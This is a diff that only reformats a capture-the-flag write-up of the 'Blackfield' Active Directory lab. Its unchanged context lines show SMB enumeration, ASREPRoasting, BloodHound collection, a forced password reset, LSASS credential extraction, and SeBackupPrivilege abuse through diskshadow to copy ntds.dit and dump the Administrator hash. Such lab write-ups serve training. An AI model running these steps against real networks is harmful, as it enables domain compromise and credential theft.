@@ -54,11 +54,11 @@ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
 Important things to note based on Nmap's output:  
-* Domain name: **_BLACKFIELD.LOCAL_**
-* Host name: **_DC01_**
-* WinRM available (_5985_)
+* Domain name: `BLACKFIELD.LOCAL`
+* Host name: `DC01`
+* WinRM available (`5985`)
 
-Before proceed to enumerate the SMB and LDAP services, we should add ***blackfield.local*** & **_dc01.blackfield.local_** to our local DNS file (_/etc/hosts_).
+Before proceed to enumerate the SMB and LDAP services, we should add `blackfield.local` & `dc01.blackfield.local` to our local DNS file (`/etc/hosts`).
 
 ```bash
 # enumerating SMB shares
@@ -77,7 +77,7 @@ SMB         10.10.10.192    445    DC01             profiles$       READ
 SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share
 ```
 
-Spidering the ***profile$*** share reveals various usernames:
+Spidering the `profile$` share reveals various usernames:
 
 ```bash
 $ nxc smb 10.10.10.192 -u 'anonymous' -p '' --spider 'profiles$' --regex .
@@ -98,7 +98,7 @@ $ nxc smb 10.10.10.192 -u 'anonymous' -p '' --spider 'profiles$' --regex . > nxc
 $ cat nxc_spider.txt | grep '[dir]' | cut -d'/' -f5 | cut -d' ' -f1 | sort | uniq > domain_users.txt
 ```
 
-Check for ASREPRoastable account:
+Check for **ASREPRoastable** accounts:
 
 ```bash
 $ getnpusers blackfield.local/ -dc-ip 10.10.10.192 -no-pass -usersfile domain_users.txt | grep 'krb5\|User'
@@ -133,7 +133,7 @@ GROUPMEM... 10.10.10.192    389    DC01             Backup Operators
 GROUPMEM... 10.10.10.192    389    DC01             Domain Users
 ```
 
-We can also collect domain information and let Bloodhound analyze it:
+We can also collect domain information and let **Bloodhound** analyze it:
 
 ```bash
 $ bloodhound-python -u support -p '#0<REDACTED>ht' -dc dc01.blackfield.local -c all -d BLACKFIELD.LOCAL -ns 10.10.10.192
@@ -161,7 +161,7 @@ WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock
 INFO: Done in 00M 06S
 ```
 
-It seems that the account ***support*** can change the password of the account ***audit2020***:
+It seems that the account `support` can change the password of the account `audit2020`:
 
 ![](blackfield_support_change_pass.png)
 
@@ -181,7 +181,7 @@ SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit20
 
 >_We can also change the user's password using [`rpcclient`](https://malicious.link/posts/2017/reset-ad-user-password-with-linux/)._
 
-Check share access for ***audit2020***:
+Check share access for `audit2020`:
 
 ```bash
 $ nxc smb 10.10.10.192 -u audit2020 -p 'p@ssw0rd!' --share forensic -M spider_plus
@@ -238,7 +238,7 @@ SMB         10.10.10.192    445    DC01             [*] Copying "memory_analysis
 SMB         10.10.10.192    445    DC01             [+] File "memory_analysis/lsass.zip" was downloaded to "lsass.zip"
 ```
 
-We can use [pypykatz](https://github.com/skelsec/pypykatz) to extract the data from the LSASS file:
+We can use [`pypykatz`](https://github.com/skelsec/pypykatz) to extract the data from the LSASS file:
 
 ```bash
 # unzip the lsass dump
@@ -310,14 +310,14 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
-We can exploit the **SeBackupPrivilege** (*[Windows Privilege Escalation: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)*) and dump the **ntds.dit** database by:
+We can exploit the **SeBackupPrivilege** (*[Windows Privilege Escalation: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)*) and dump the `ntds.dit` database by:
 
-- Writing a small script for the ***[diskshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)*** utility to expose the *c:* drive
+- Writing a small script for the **[diskshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)** utility to expose the *c:* drive
 - Convert the script in a Windows-compatible format
 - Upload the script on the target
 - Move to a directory with write access
 - Expose the shadow copy
-- Download the _ntds.dit_ database
+- Download the `ntds.dit` database
 
 ```bash
 # write a diskshadow script
@@ -422,7 +422,7 @@ Info: Downloading C:\Windows\Temp\ntds.dit to ntds.dit
 Info: Download successful!
 ```
 
-We also need to exfiltrate the _system.hive_ file:
+We also need to exfiltrate the `system.hive` file:
 
 ```bash
 # make a copy of the file
@@ -437,7 +437,7 @@ Info: Downloading C:\\system.hive to system.hive
 Info: Download successful!
 ```
 
-Now the ***Administrator*** hash can be easily dumped which let us compromise the ***root.txt*** file:
+Now the `Administrator` hash can be easily dumped which let us compromise the `root.txt` file:
 
 ```bash
 # dump the administrator hash
